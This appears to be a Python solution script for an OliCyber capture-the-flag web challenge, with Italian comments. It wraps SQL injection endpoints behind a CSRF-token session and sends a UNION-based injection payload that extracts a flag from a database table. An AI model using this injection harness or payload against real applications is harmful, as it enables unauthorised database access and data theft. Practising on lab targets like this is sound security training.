import requests as rr
import binascii
import time

url = " http://web-17.challs.olicyber.it/union"

class Inj:
    def __init__(self, host):
        self.sess = rr.Session()  # crea un istanza di oggetto session per mantenersi nella stessa sessione
        self.base_url = '{}/api/'.format(host)
        self._refresh_csrf_token()  # aggiorna il token cross site request forgery

    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + 'get_token')  # fa un get tramite l'oggetto sessione e salva i token
        resp = resp.json()
        self.token = resp['token']

    def _do_raw_req(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query}
        return self.sess.post(url, json=data, headers=headers).json()  # restituisce il json

    def logic(self, query):
        url = self.base_url + 'logic'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def union(self, query):
        url = self.base_url + 'union'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def blind(self, query):
        url = self.base_url + 'blind'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def time(self, query):
        url = self.base_url + 'time'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

inj = Inj(url)
r, error = inj.logic("1' UNION SELECT flag, 2,3,4,5,6 from real_data where '1 = 1")
print(r)